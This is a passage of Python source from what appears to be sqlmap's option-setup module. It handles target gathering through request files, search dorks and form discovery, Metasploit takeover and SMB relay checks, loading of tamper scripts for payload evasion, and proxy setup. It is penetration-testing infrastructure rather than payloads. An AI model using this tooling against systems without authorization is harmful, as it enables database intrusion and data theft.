 def format(record):\n        message = FORMATTER._format(record)\n        message = boldifyMessage(message)\n        if kb.get(\"prependFlag\"):\n            message = \"\\n%s\" % message\n            kb.prependFlag = False\n        return message\n\n    FORMATTER._format = FORMATTER.format\n    FORMATTER.format = format\n\ndef _setRequestFromFile():\n    \"\"\"\n    This function checks if the way to make a HTTP request is through supplied\n    textual file, parses it and saves the information into the knowledge base.\n    \"\"\"\n\n    if conf.requestFile:\n        for requestFile in re.split(PARAMETER_SPLITTING_REGEX, conf.requestFile):\n            requestFile = safeExpandUser(requestFile)\n            url = None\n            seen = set()\n\n            if not checkFile(requestFile, False):\n                errMsg = \"specified HTTP request file '%s' \" % requestFile\n                errMsg += \"does not exist\"\n                raise SqlmapFilePathException(errMsg)\n\n            infoMsg = \"parsing HTTP request from '%s'\" % requestFile\n            logger.info(infoMsg)\n\n            for target in parseRequestFile(requestFile):\n                url = target[0]\n                if url not in seen:\n                    kb.targets.add(target)\n                    if len(kb.targets) > 1:\n                        conf.multipleTargets = True\n                    seen.add(url)\n\n            if url is None:\n                errMsg = \"specified file '%s' \" % requestFile\n                errMsg += \"does not contain a usable HTTP request (with parameters)\"\n                raise SqlmapDataException(errMsg)\n\n    if conf.secondReq:\n        conf.secondReq = safeExpandUser(conf.secondReq)\n\n        if not checkFile(conf.secondReq, False):\n            errMsg = \"specified second-order HTTP request file '%s' \" % conf.secondReq\n            errMsg += \"does not exist\"\n            raise SqlmapFilePathException(errMsg)\n\n        infoMsg = \"parsing second-order HTTP request from '%s'\" % conf.secondReq\n        logger.info(infoMsg)\n\n        try:\n            target = next(parseRequestFile(conf.secondReq, False))\n            kb.secondReq = target\n        except StopIteration:\n            errMsg = \"specified second-order HTTP request file '%s' \" % conf.secondReq\n            errMsg += \"does not contain a valid HTTP request\"\n            raise SqlmapDataException(errMsg)\n\ndef _setCrawler():\n    if not conf.crawlDepth:\n        return\n\n    if not conf.bulkFile:\n        if conf.url:\n            crawl(conf.url)\n        elif conf.requestFile and kb.targets:\n            target = next(iter(kb.targets))\n            crawl(target[0], target[2], target[3])\n\ndef _doSearch():\n    \"\"\"\n    This function performs search dorking, parses results\n    and saves the testable hosts into the knowledge base.\n    \"\"\"\n\n    if not conf.googleDork:\n        return\n\n    kb.data.onlyGETs = None\n\n    def retrieve():\n        links = search(conf.googleDork)\n\n        if not links:\n            errMsg = \"unable to find results for your \"\n            errMsg += \"search dork expression\"\n            raise SqlmapGenericException(errMsg)\n\n        for link in links:\n            link = urldecode(link)\n            if re.search(r\"(.*?)\\?(.+)\", link) or conf.forms:\n                kb.targets.add((link, conf.method, conf.data, conf.cookie, None))\n            elif re.search(URI_INJECTABLE_REGEX, link, re.I):\n                if kb.data.onlyGETs is None and conf.data is None and not conf.googleDork:\n                    message = \"do you want to scan only results containing GET parameters? [Y/n] \"\n                    kb.data.onlyGETs = readInput(message, default='Y', boolean=True)\n                if not kb.data.onlyGETs or conf.googleDork:\n                    kb.targets.add((link, conf.method, conf.data, conf.cookie, None))\n\n        return links\n\n    while True:\n        links = retrieve()\n\n        if kb.targets:\n            infoMsg = \"found %d results for your \" % len(links)\n            infoMsg += \"search dork expression\"\n\n            if not conf.forms:\n                infoMsg += \", \"\n\n                if len(links) == len(kb.targets):\n                    infoMsg += \"all \"\n                else:\n                    infoMsg += \"%d \" % len(kb.targets)\n\n                infoMsg += \"of them are testable targets\"\n\n            logger.info(infoMsg)\n            break\n\n        else:\n            message = \"found %d results \" % len(links)\n            message += \"for your search dork expression, but none of them \"\n            message += \"have GET parameters to test for SQL injection. \"\n            message += \"Do you want to skip to the next result page? [Y/n]\"\n\n            if not readInput(message, default='Y', boolean=True):\n                raise SqlmapSilentQuitException\n            else:\n                conf.googlePage += 1\n\ndef _setStdinPipeTargets():\n    if conf.url:\n        return\n\n    if isinstance(conf.stdinPipe, _collections.Iterable):\n        infoMsg = \"using 'STDIN' for parsing targets list\"\n        logger.info(infoMsg)\n\n        class _(object):\n            def __init__(self):\n                self.__rest = OrderedSet()\n\n            def __iter__(self):\n                return self\n\n            def __next__(self):\n                return self.next()\n\n            def next(self):\n                try:\n                    line = next(conf.stdinPipe)\n                except (IOError, OSError, TypeError):\n                    line = None\n\n                if line:\n                    match = re.search(r\"\\b(https?://[^\\s'\\\"]+|[\\w.]+\\.\\w{2,3}[/\\w+]*\\?[^\\s'\\\"]+)\", line, re.I)\n                    if match:\n                        return (match.group(0), conf.method, conf.data, conf.cookie, None)\n                elif self.__rest:\n                    return self.__rest.pop()\n\n                raise StopIteration()\n\n            def add(self, elem):\n                self.__rest.add(elem)\n\n        kb.targets = _()\n\ndef _setBulkMultipleTargets():\n    if not conf.bulkFile:\n        return\n\n    conf.bulkFile = safeExpandUser(conf.bulkFile)\n\n    infoMsg = \"parsing multiple targets list from '%s'\" % conf.bulkFile\n    logger.info(infoMsg)\n\n    if not checkFile(conf.bulkFile, False):\n        errMsg = \"the specified bulk file \"\n        errMsg += \"does not exist\"\n        raise SqlmapFilePathException(errMsg)\n\n    found = False\n    for line in getFileItems(conf.bulkFile):\n        if conf.scope and not re.search(conf.scope, line, re.I):\n            continue\n\n        if re.match(r\"[^ ]+\\?(.+)\", line, re.I) or kb.customInjectionMark in line or conf.data:\n            found = True\n            kb.targets.add((line.strip(), conf.method, conf.data, conf.cookie, None))\n\n    if not found and not conf.forms and not conf.crawlDepth:\n        warnMsg = \"no usable links found (with GET parameters)\"\n        logger.warning(warnMsg)\n\ndef _findPageForms():\n    if not conf.forms or conf.crawlDepth:\n        return\n\n    if conf.url and not checkConnection():\n        return\n\n    found = False\n    infoMsg = \"searching for forms\"\n    logger.info(infoMsg)\n\n    if not any((conf.bulkFile, conf.googleDork)):\n        page, _, _ = Request.queryPage(content=True, ignoreSecondOrder=True)\n        if findPageForms(page, conf.url, True, True):\n            found = True\n    else:\n        if conf.bulkFile:\n            targets = getFileItems(conf.bulkFile)\n        elif conf.googleDork:\n            targets = [_[0] for _ in kb.targets]\n            kb.targets.clear()\n        else:\n            targets = []\n\n        for i in xrange(len(targets)):\n            try:\n                target = targets[i].strip()\n\n                if not re.search(r\"(?i)\\Ahttp[s]*://\", target):\n                    target = \"http://%s\" % target\n\n                page, _, _ = Request.getPage(url=target.strip(), cookie=conf.cookie, crawling=True, raise404=False)\n                if findPageForms(page, target, False, True):\n                    found = True\n\n                if conf.verbose in (1, 2):\n                    status = '%d/%d links visited (%d%%)' % (i + 1, len(targets), round(100.0 * (i + 1) / len(targets)))\n                    dataToStdout(\"\\r[%s] [INFO] %s\" % (time.strftime(\"%X\"), status), True)\n            except KeyboardInterrupt:\n                break\n            except Exception as ex:\n                errMsg = \"problem occurred while searching for forms at '%s' ('%s')\" % (target, getSafeExString(ex))\n                logger.error(errMsg)\n\n    if not found:\n        warnMsg = \"no forms found\"\n        logger.warning(warnMsg)\n\ndef _setDBMSAuthentication():\n    \"\"\"\n    Check and set the DBMS authentication credentials to run statements as\n    another user, not the session user\n    \"\"\"\n\n    if not conf.dbmsCred:\n        return\n\n    debugMsg = \"setting the DBMS authentication credentials\"\n    logger.debug(debugMsg)\n\n    match = re.search(r\"^(.+?):(.*?)$\", conf.dbmsCred)\n\n    if not match:\n        errMsg = \"DBMS authentication credentials value must be in format \"\n        errMsg += \"username:password\"\n        raise SqlmapSyntaxException(errMsg)\n\n    conf.dbmsUsername = match.group(1)\n    conf.dbmsPassword = match.group(2)\n\ndef _setMetasploit():\n    if not conf.osPwn and not conf.osSmb and not conf.osBof:\n        return\n\n    debugMsg = \"setting the takeover out-of-band functionality\"\n    logger.debug(debugMsg)\n\n    msfEnvPathExists = False\n\n    if IS_WIN:\n        try:\n            __import__(\"win32file\")\n        except ImportError:\n            errMsg = \"sqlmap requires third-party module 'pywin32' \"\n            errMsg += \"in order to use Metasploit functionalities on \"\n            errMsg += \"Windows. You can download it from \"\n            errMsg += \"'https://github.com/mhammond/pywin32'\"\n            raise SqlmapMissingDependence(errMsg)\n\n        if not conf.msfPath:\n            for candidate in os.environ.get(\"PATH\", \"\").split(';'):\n                if all(_ in candidate for _ in (\"metasploit\", \"bin\")):\n                    conf.msfPath = os.path.dirname(candidate.rstrip('\\\\'))\n                    break\n\n    if conf.osSmb:\n        isAdmin = runningAsAdmin()\n\n        if not isAdmin:\n            errMsg = \"you need to run sqlmap as an administrator \"\n            errMsg += \"if you want to perform a SMB relay attack because \"\n            errMsg += \"it will need to listen on a user-specified SMB \"\n            errMsg += \"TCP port for incoming connection attempts\"\n            raise SqlmapMissingPrivileges(errMsg)\n\n    if conf.msfPath:\n        for path in (conf.msfPath, os.path.join(conf.msfPath, \"bin\")):\n            if any(os.path.exists(normalizePath(os.path.join(path, \"%s%s\" % (_, \".bat\" if IS_WIN else \"\")))) for _ in (\"msfcli\", \"msfconsole\")):\n                msfEnvPathExists = True\n                if all(os.path.exists(normalizePath(os.path.join(path, \"%s%s\" % (_, \".bat\" if IS_WIN else \"\")))) for _ in (\"msfvenom\",)):\n                    kb.oldMsf = False\n                elif all(os.path.exists(normalizePath(os.path.join(path, \"%s%s\" % (_, \".bat\" if IS_WIN else \"\")))) for _ in (\"msfencode\", \"msfpayload\")):\n                    kb.oldMsf = True\n                else:\n                    msfEnvPathExists = False\n\n                conf.msfPath = path\n                break\n\n        if msfEnvPathExists:\n            debugMsg = \"provided Metasploit Framework path \"\n            debugMsg += \"'%s' is valid\" % conf.msfPath\n            logger.debug(debugMsg)\n        else:\n            warnMsg = \"the provided Metasploit Framework path \"\n            warnMsg += \"'%s' is not valid. The cause could \" % conf.msfPath\n            warnMsg += \"be that the path does not exists or that one \"\n            warnMsg += \"or more of the needed Metasploit executables \"\n            warnMsg += \"within msfcli, msfconsole, msfencode and \"\n            warnMsg += \"msfpayload do not exist\"\n            logger.warning(warnMsg)\n    else:\n        warnMsg = \"you did not provide the local path where Metasploit \"\n        warnMsg += \"Framework is installed\"\n        logger.warning(warnMsg)\n\n    if not msfEnvPathExists:\n        warnMsg = \"sqlmap is going to look for Metasploit Framework \"\n        warnMsg += \"installation inside the environment path(s)\"\n        logger.warning(warnMsg)\n\n        envPaths = os.environ.get(\"PATH\", \"\").split(\";\" if IS_WIN else \":\")\n\n        for envPath in envPaths:\n            envPath = envPath.replace(\";\", \"\")\n\n            if any(os.path.exists(normalizePath(os.path.join(envPath, \"%s%s\" % (_, \".bat\" if IS_WIN else \"\")))) for _ in (\"msfcli\", \"msfconsole\")):\n                msfEnvPathExists = True\n                if all(os.path.exists(normalizePath(os.path.join(envPath, \"%s%s\" % (_, \".bat\" if IS_WIN else \"\")))) for _ in (\"msfvenom\",)):\n                    kb.oldMsf = False\n                elif all(os.path.exists(normalizePath(os.path.join(envPath, \"%s%s\" % (_, \".bat\" if IS_WIN else \"\")))) for _ in (\"msfencode\", \"msfpayload\")):\n                    kb.oldMsf = True\n                else:\n                    msfEnvPathExists = False\n\n                if msfEnvPathExists:\n                    infoMsg = \"Metasploit Framework has been found \"\n                    infoMsg += \"installed in the '%s' path\" % envPath\n                    logger.info(infoMsg)\n\n                    conf.msfPath = envPath\n\n                    break\n\n    if not msfEnvPathExists:\n        errMsg = \"unable to locate Metasploit Framework installation. \"\n        errMsg += \"You can get it at 'https://www.metasploit.com/download/'\"\n        raise SqlmapFilePathException(errMsg)\n\ndef _setWriteFile():\n    if not conf.fileWrite:\n        return\n\n    debugMsg = \"setting the write file functionality\"\n    logger.debug(debugMsg)\n\n    if not os.path.exists(conf.fileWrite):\n        errMsg = \"the provided local file '%s' does not exist\" % conf.fileWrite\n        raise SqlmapFilePathException(errMsg)\n\n    if not conf.fileDest:\n        errMsg = \"you did not provide the back-end DBMS absolute path \"\n        errMsg += \"where you want to write the local file '%s'\" % conf.fileWrite\n        raise SqlmapMissingMandatoryOptionException(errMsg)\n\n    conf.fileWriteType = getFileType(conf.fileWrite)\n\ndef _setOS():\n    \"\"\"\n    Force the back-end DBMS operating system option.\n    \"\"\"\n\n    if not conf.os:\n        return\n\n    if conf.os.lower() not in SUPPORTED_OS:\n        errMsg = \"you provided an unsupported back-end DBMS operating \"\n        errMsg += \"system. The supported DBMS operating systems for OS \"\n        errMsg += \"and file system access are %s. \" % ', '.join([o.capitalize() for o in SUPPORTED_OS])\n        errMsg += \"If you do not know the back-end DBMS underlying OS, \"\n        errMsg += \"do not provide it and sqlmap will fingerprint it for \"\n        errMsg += \"you.\"\n        raise SqlmapUnsupportedDBMSException(errMsg)\n\n    debugMsg = \"forcing back-end DBMS operating system to user defined \"\n    debugMsg += \"value '%s'\" % conf.os\n    logger.debug(debugMsg)\n\n    Backend.setOs(conf.os)\n\ndef _setTechnique():\n    validTechniques = sorted(getPublicTypeMembers(PAYLOAD.TECHNIQUE), key=lambda x: x[1])\n    validLetters = [_[0][0].upper() for _ in validTechniques]\n\n    if conf.technique and isinstance(conf.technique, six.string_types):\n        _ = []\n\n        for letter in conf.technique.upper():\n            if letter not in validLetters:\n                errMsg = \"value for --technique must be a string composed \"\n                errMsg += \"by the letters %s. Refer to the \" % \", \".join(validLetters)\n                errMsg += \"user's manual for details\"\n                raise SqlmapSyntaxException(errMsg)\n\n            for validTech, validInt in validTechniques:\n                if letter == validTech[0]:\n                    _.append(validInt)\n                    break\n\n        conf.technique = _\n\ndef _setDBMS():\n    \"\"\"\n    Force the back-end DBMS option.\n    \"\"\"\n\n    if not conf.dbms:\n        return\n\n    debugMsg = \"forcing back-end DBMS to user defined value\"\n    logger.debug(debugMsg)\n\n    conf.dbms = conf.dbms.lower()\n    regex = re.search(r\"%s ([\\d\\.]+)\" % (\"(%s)\" % \"|\".join(SUPPORTED_DBMS)), conf.dbms, re.I)\n\n    if regex:\n        conf.dbms = regex.group(1)\n        Backend.setVersion(regex.group(2))\n\n    if conf.dbms not in SUPPORTED_DBMS:\n        errMsg = \"you provided an unsupported back-end database management \"\n        errMsg += \"system. Supported DBMSes are as follows: %s. \" % ', '.join(sorted((_ for _ in (list(DBMS_DICT) + getPublicTypeMembers(FORK, True))), key=str.lower))\n        errMsg += \"If you do not know the back-end DBMS, do not provide \"\n        errMsg += \"it and sqlmap will fingerprint it for you.\"\n        raise SqlmapUnsupportedDBMSException(errMsg)\n\n    for dbms, aliases in DBMS_ALIASES:\n        if conf.dbms in aliases:\n            conf.dbms = dbms\n\n            break\n\ndef _listTamperingFunctions():\n    \"\"\"\n    Lists available tamper functions\n    \"\"\"\n\n    if conf.listTampers:\n        infoMsg = \"listing available tamper scripts\\n\"\n        logger.info(infoMsg)\n\n        for script in sorted(glob.glob(os.path.join(paths.SQLMAP_TAMPER_PATH, \"*.py\"))):\n            content = openFile(script, \"rb\").read()\n            match = re.search(r'(?s)__priority__.+\"\"\"(.+)\"\"\"', content)\n            if match:\n                comment = match.group(1).strip()\n                dataToStdout(\"* %s - %s\\n\" % (setColor(os.path.basename(script), \"yellow\"), re.sub(r\" *\\n *\", \" \", comment.split(\"\\n\\n\")[0].strip())))\n\ndef _setTamperingFunctions():\n    \"\"\"\n    Loads tampering functions from given script(s)\n    \"\"\"\n\n    if conf.tamper:\n        last_priority = PRIORITY.HIGHEST\n        check_priority = True\n        resolve_priorities = False\n        priorities = []\n\n        for script in re.split(PARAMETER_SPLITTING_REGEX, conf.tamper):\n            found = False\n\n            path = safeFilepathEncode(paths.SQLMAP_TAMPER_PATH)\n            script = safeFilepathEncode(script.strip())\n\n            try:\n                if not script:\n                    continue\n\n                elif os.path.exists(os.path.join(path, script if script.endswith(\".py\") else \"%s.py\" % script)):\n                    script = os.path.join(path, script if script.endswith(\".py\") else \"%s.py\" % script)\n\n                elif not os.path.exists(script):\n                    errMsg = \"tamper script '%s' does not exist\" % script\n                    raise SqlmapFilePathException(errMsg)\n\n                elif not script.endswith(\".py\"):\n                    errMsg = \"tamper script '%s' should have an extension '.py'\" % script\n                    raise SqlmapSyntaxException(errMsg)\n            except UnicodeDecodeError:\n                errMsg = \"invalid character provided in option '--tamper'\"\n                raise SqlmapSyntaxException(errMsg)\n\n            dirname, filename = os.path.split(script)\n            dirname = os.path.abspath(dirname)\n\n            infoMsg = \"loading tamper module '%s'\" % filename[:-3]\n            logger.info(infoMsg)\n\n            if not os.path.exists(os.path.join(dirname, \"__init__.py\")):\n                errMsg = \"make sure that there is an empty file '__init__.py' \"\n                errMsg += \"inside of tamper scripts directory '%s'\" % dirname\n                raise SqlmapGenericException(errMsg)\n\n            if dirname not in sys.path:\n                sys.path.insert(0, dirname)\n\n            try:\n                module = __import__(safeFilepathEncode(filename[:-3]))\n            except Exception as ex:\n                raise SqlmapSyntaxException(\"cannot import tamper module '%s' (%s)\" % (getUnicode(filename[:-3]), getSafeExString(ex)))\n\n            priority = PRIORITY.NORMAL if not hasattr(module, \"__priority__\") else module.__priority__\n\n            for name, function in inspect.getmembers(module, inspect.isfunction):\n                if name == \"tamper\" and (hasattr(inspect, \"signature\") and all(_ in inspect.signature(function).parameters for _ in (\"payload\", \"kwargs\")) or inspect.getargspec(function).args and inspect.getargspec(function).keywords == \"kwargs\"):\n                    found = True\n                    kb.tamperFunctions.append(function)\n                    function.__name__ = module.__name__\n\n                    if check_priority and priority > last_priority:\n                        message = \"it appears that you might have mixed \"\n                        message += \"the order of tamper scripts. \"\n                        message += \"Do you want to auto resolve this? [Y/n/q] \"\n                        choice = readInput(message, default='Y').upper()\n\n                        if choice == 'N':\n                            resolve_priorities = False\n                        elif choice == 'Q':\n                            raise SqlmapUserQuitException\n                        else:\n                            resolve_priorities = True\n\n                        check_priority = False\n\n                    priorities.append((priority, function))\n                    last_priority = priority\n\n                    break\n                elif name == \"dependencies\":\n                    try:\n                        function()\n                    except Exception as ex:\n                        errMsg = \"error occurred while checking dependencies \"\n                        errMsg += \"for tamper module '%s' ('%s')\" % (getUnicode(filename[:-3]), getSafeExString(ex))\n                        raise SqlmapGenericException(errMsg)\n\n            if not found:\n                errMsg = \"missing function 'tamper(payload, **kwargs)' \"\n                errMsg += \"in tamper script '%s'\" % script\n                raise SqlmapGenericException(errMsg)\n\n        if kb.tamperFunctions and len(kb.tamperFunctions) > 3:\n            warnMsg = \"using too many tamper scripts is usually not \"\n            warnMsg += \"a good idea\"\n            logger.warning(warnMsg)\n\n        if resolve_priorities and priorities:\n            priorities.sort(key=functools.cmp_to_key(lambda a, b: cmp(a[0], b[0])), reverse=True)\n            kb.tamperFunctions = []\n\n            for _, function in priorities:\n                kb.tamperFunctions.append(function)\n\ndef _setPreprocessFunctions():\n    \"\"\"\n    Loads preprocess function(s) from given script(s)\n    \"\"\"\n\n    if conf.preprocess:\n        for script in re.split(PARAMETER_SPLITTING_REGEX, conf.preprocess):\n            found = False\n            function = None\n\n            script = safeFilepathEncode(script.strip())\n\n            try:\n                if not script:\n                    continue\n\n                if not os.path.exists(script):\n                    errMsg = \"preprocess script '%s' does not exist\" % script\n                    raise SqlmapFilePathException(errMsg)\n\n                elif not script.endswith(\".py\"):\n                    errMsg = \"preprocess script '%s' should have an extension '.py'\" % script\n                    raise SqlmapSyntaxException(errMsg)\n            except UnicodeDecodeError:\n                errMsg = \"invalid character provided in option '--preprocess'\"\n                raise SqlmapSyntaxException(errMsg)\n\n            dirname, filename = os.path.split(script)\n            dirname = os.path.abspath(dirname)\n\n            infoMsg = \"loading preprocess module '%s'\" % filename[:-3]\n            logger.info(infoMsg)\n\n            if not os.path.exists(os.path.join(dirname, \"__init__.py\")):\n                errMsg = \"make sure that there is an empty file '__init__.py' \"\n                errMsg += \"inside of preprocess scripts directory '%s'\" % dirname\n                raise SqlmapGenericException(errMsg)\n\n            if dirname not in sys.path:\n                sys.path.insert(0, dirname)\n\n            try:\n                module = __import__(safeFilepathEncode(filename[:-3]))\n            except Exception as ex:\n                raise SqlmapSyntaxException(\"cannot import preprocess module '%s' (%s)\" % (getUnicode(filename[:-3]), getSafeExString(ex)))\n\n            for name, function in inspect.getmembers(module, inspect.isfunction):\n                try:\n                    if name == \"preprocess\" and inspect.getargspec(function).args and all(_ in inspect.getargspec(function).args for _ in (\"req\",)):\n                        found = True\n\n                        kb.preprocessFunctions.append(function)\n                        function.__name__ = module.__name__\n\n                        break\n                except ValueError:  # Note: https://github.com/sqlmapproject/sqlmap/issues/4357\n                    pass\n\n            if not found:\n                errMsg = \"missing function 'preprocess(req)' \"\n                errMsg += \"in preprocess script '%s'\" % script\n                raise SqlmapGenericException(errMsg)\n            else:\n                try:\n                    function(_urllib.request.Request(\"http://localhost\"))\n                except Exception as ex:\n                    tbMsg = traceback.format_exc()\n\n                    if conf.debug:\n                        dataToStdout(tbMsg)\n\n                    handle, filename = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.PREPROCESS, suffix=\".py\")\n                    os.close(handle)\n\n                    openFile(filename, \"w+b\").write(\"#!/usr/bin/env\\n\\ndef preprocess(req):\\n    pass\\n\")\n                    openFile(os.path.join(os.path.dirname(filename), \"__init__.py\"), \"w+b\").write(\"pass\")\n\n                    errMsg = \"function 'preprocess(req)' \"\n                    errMsg += \"in preprocess script '%s' \" % script\n                    errMsg += \"had issues in a test run ('%s'). \" % getSafeExString(ex)\n                    errMsg += \"You can find a template script at '%s'\" % filename\n                    raise SqlmapGenericException(errMsg)\n\ndef _setPostprocessFunctions():\n    \"\"\"\n    Loads postprocess function(s) from given script(s)\n    \"\"\"\n\n    if conf.postprocess:\n        for script in re.split(PARAMETER_SPLITTING_REGEX, conf.postprocess):\n            found = False\n            function = None\n\n            script = safeFilepathEncode(script.strip())\n\n            try:\n                if not script:\n                    continue\n\n                if not os.path.exists(script):\n                    errMsg = \"postprocess script '%s' does not exist\" % script\n                    raise SqlmapFilePathException(errMsg)\n\n                elif not script.endswith(\".py\"):\n                    errMsg = \"postprocess script '%s' should have an extension '.py'\" % script\n                    raise SqlmapSyntaxException(errMsg)\n            except UnicodeDecodeError:\n                errMsg = \"invalid character provided in option '--postprocess'\"\n                raise SqlmapSyntaxException(errMsg)\n\n            dirname, filename = os.path.split(script)\n            dirname = os.path.abspath(dirname)\n\n            infoMsg = \"loading postprocess module '%s'\" % filename[:-3]\n            logger.info(infoMsg)\n\n            if not os.path.exists(os.path.join(dirname, \"__init__.py\")):\n                errMsg = \"make sure that there is an empty file '__init__.py' \"\n                errMsg += \"inside of postprocess scripts directory '%s'\" % dirname\n                raise SqlmapGenericException(errMsg)\n\n            if dirname not in sys.path:\n                sys.path.insert(0, dirname)\n\n            try:\n                module = __import__(safeFilepathEncode(filename[:-3]))\n            except Exception as ex:\n                raise SqlmapSyntaxException(\"cannot import postprocess module '%s' (%s)\" % (getUnicode(filename[:-3]), getSafeExString(ex)))\n\n            for name, function in inspect.getmembers(module, inspect.isfunction):\n                if name == \"postprocess\" and inspect.getargspec(function).args and all(_ in inspect.getargspec(function).args for _ in (\"page\", \"headers\", \"code\")):\n                    found = True\n\n                    kb.postprocessFunctions.append(function)\n                    function.__name__ = module.__name__\n\n                    break\n\n            if not found:\n                errMsg = \"missing function 'postprocess(page, headers=None, code=None)' \"\n                errMsg += \"in postprocess script '%s'\" % script\n                raise SqlmapGenericException(errMsg)\n            else:\n                try:\n                    _, _, _ = function(\"\", {}, None)\n                except:\n                    handle, filename = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.PREPROCESS, suffix=\".py\")\n                    os.close(handle)\n\n                    openFile(filename, \"w+b\").write(\"#!/usr/bin/env\\n\\ndef postprocess(page, headers=None, code=None):\\n    return page, headers, code\\n\")\n                    openFile(os.path.join(os.path.dirname(filename), \"__init__.py\"), \"w+b\").write(\"pass\")\n\n                    errMsg = \"function 'postprocess(page, headers=None, code=None)' \"\n                    errMsg += \"in postprocess script '%s' \" % script\n                    errMsg += \"should return a tuple '(page, headers, code)' \"\n                    errMsg += \"(Note: find template script at '%s')\" % filename\n                    raise SqlmapGenericException(errMsg)\n\ndef _setThreads():\n    if not isinstance(conf.threads, int) or conf.threads <= 0:\n        conf.threads = 1\n\ndef _setDNSCache():\n    \"\"\"\n    Makes a cached version of socket._getaddrinfo to avoid subsequent DNS requests.\n    \"\"\"\n\n    def _getaddrinfo(*args, **kwargs):\n        if args in kb.cache.addrinfo:\n            return kb.cache.addrinfo[args]\n\n        else:\n            kb.cache.addrinfo[args] = socket._getaddrinfo(*args, **kwargs)\n            return kb.cache.addrinfo[args]\n\n    if not hasattr(socket, \"_getaddrinfo\"):\n        socket._getaddrinfo = socket.getaddrinfo\n        socket.getaddrinfo = _getaddrinfo\n\ndef _setSocketPreConnect():\n    \"\"\"\n    Makes a pre-connect version of socket.create_connection\n    \"\"\"\n\n    if conf.disablePrecon:\n        return\n\n    def _thread():\n        while kb.get(\"threadContinue\") and not conf.get(\"disablePrecon\"):\n            try:\n                for key in socket._ready:\n                    if len(socket._ready[key]) < SOCKET_PRE_CONNECT_QUEUE_SIZE:\n                        s = socket.create_connection(*key[0], **dict(key[1]))\n                        with kb.locks.socket:\n                            socket._ready[key].append((s, time.time()))\n            except KeyboardInterrupt:\n                break\n            except:\n                pass\n            finally:\n                time.sleep(0.01)\n\n    def create_connection(*args, **kwargs):\n        retVal = None\n\n        key = (tuple(args), frozenset(kwargs.items()))\n        with kb.locks.socket:\n            if key not in socket._ready:\n                socket._ready[key] = []\n\n            while len(socket._ready[key]) > 0:\n                candidate, created = socket._ready[key].pop(0)\n                if (time.time() - created) < PRECONNECT_CANDIDATE_TIMEOUT:\n                    retVal = candidate\n                    break\n                else:\n                    try:\n                        candidate.shutdown(socket.SHUT_RDWR)\n                        candidate.close()\n                    except socket.error:\n                        pass\n\n        if not retVal:\n            retVal = socket._create_connection(*args, **kwargs)\n\n        return retVal\n\n    if not hasattr(socket, \"_create_connection\"):\n        socket._ready = {}\n        socket._create_connection = socket.create_connection\n        socket.create_connection = create_connection\n\n        thread = threading.Thread(target=_thread)\n        setDaemon(thread)\n        thread.start()\n\ndef _setHTTPHandlers():\n    \"\"\"\n    Check and set the HTTP/SOCKS proxy for all HTTP requests.\n    \"\"\"\n\n    with kb.locks.handlers:\n        if conf.proxyList:\n            conf.proxy = conf.proxyList[0]\n            conf.proxyList = conf.proxyList[1:] + conf.proxyList[:1]\n\n            if len(conf.proxyList) > 1:\n                infoMsg = \"loading proxy '%s' from a supplied proxy list file\" % conf.proxy\n                logger.info(infoMsg)\n\n        elif not conf.proxy:\n            if conf.hostname in (\"localhost\", \"127.0.0.1\") or conf.ignoreProxy:\n                proxyHandler.proxies = {}\n\n        if conf.proxy:\n            debugMsg = \"setting the HTTP/SOCKS proxy for all HTTP requests\"\n            logger.debug(debugMsg)\n\n            try:\n                _ = _urllib.parse.urlsplit(conf.proxy)\n            except Exception as ex:\n                errMsg = \"invalid proxy address '%s' ('%s')\" % (conf.proxy, getSafeExString(ex))\n                raise SqlmapSyntaxException(errMsg)\n\n            hostnamePort = _.netloc.rsplit(\":\", 1)\n\n            scheme = _.scheme.upper()\n            hostname = hostnamePort[0]\n            port = None\n            username = None\n            password = None\n\n            if len(hostnamePort) == 2:\n                try:\n                    port = int(hostnamePort[1])\n                except:\n                    pass  # drops into the next check block\n\n            if not all((scheme, hasattr(PROXY_TYPE, scheme), hostname, port)):\n                errMsg = \"proxy value must be in format '(%s)://address:port'\" % \"|\".join(_[0].lower() for _ in getPublicTypeMembers(PROXY_TYPE))\n                raise SqlmapSyntaxException(errMsg)\n\n            if conf.proxyCred:\n                _ = re.search(r\"\\A(.*?):(.*?)\\Z\", conf.proxyCred)\n                if not _:\n                    errMsg = \"proxy authentication credentials \"\n                    errMsg += \"value must be in format username:password\"\n                    raise SqlmapSyntaxException(errMsg)\n                else:\n                    username = _.group(1)\n                    password = _.group(2)\n\n            if scheme in (PROXY_TYPE.SOCKS4, PROXY_TYPE.SOCKS5):\n                proxyHandler.proxies = {}\n\n                if scheme == PROXY_TYPE.SOCKS4:\n                    warnMsg = \"SOCKS4 does not support resolving (DNS) names (i.e. causing DNS leakage)\"\n                    singleTimeWarnMessage(warnMsg)\n\n                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5 if scheme == PROXY_TYPE.SOCKS5 else socks.PROXY_TYPE_SOCKS4, hostname, port, username=username, password=password)\n                socks.wrapmodule(_http_client)\n            else:\n                socks.unwrapmodule(_http_client)\n\n                if conf.proxyCred:\n                    # Reference: http://stackoverflow.com/questions/34079/how-to-specify-an-authenticated-proxy-for-a-python-http-connection\n                    proxyString = \"%s@\" % conf.proxyCred\n                else:\n                    proxyString = \"\"\n\n                proxyString += \"%s:%d\" % (hostname, port)\n                proxyHandler.proxies = {\"http\": proxyString, \"https\": proxyString}\n\n            proxyHandler.__init__(proxyHandler.proxies)\n\n        if not proxyHandler.proxies:\n            for _ in (\"http\", \"https\"):\n                if hasattr(proxyHandler, \"%s_open\" % _):\n                    delattr(proxyHandler, \"%s_open\" % _)\n\n        debugMsg = \"creating HTTP requests opener object\"\n        logger.debug(debugMsg)\n\n        handlers = filterNone([multipartPostHandler, proxyHandler if proxyHandler.proxies else None, authHandler, redirectHandler, rangeHandler, chunkedHandler if conf.chunked else None, httpsHandler])\n\n        if not conf.dropSetCookie:\n            if not conf.loadCookies:\n                conf.cj = _http_cookiejar.CookieJar()\n            else:\n                conf.cj = _http_cookiejar.MozillaCookieJar()\n                resetCookieJar(conf.cj)\n\n            handlers.append(_urllib.request.HTTPCookieProcessor(conf.cj))\n\n        # Reference: http://www.w3.org/Protocols/rfc2616/rfc2616-sec8.html\n        if conf.keepAlive:\n            warnMsg = \"persistent HTTP(s) connections, Keep-Alive, has \"\n            warnMsg += \"been disabled because of its incompatibility \"\n\n            if conf.proxy:\n                warnMsg += \"with HTTP(s) proxy\"\n                logger.warning(warnMsg)\n            elif conf.authType:\n                warnMsg += \"with authentication methods\"\n                logger.warning(warnMsg)\n            else:\n                handlers.append(keepAliveHandler)\n\n       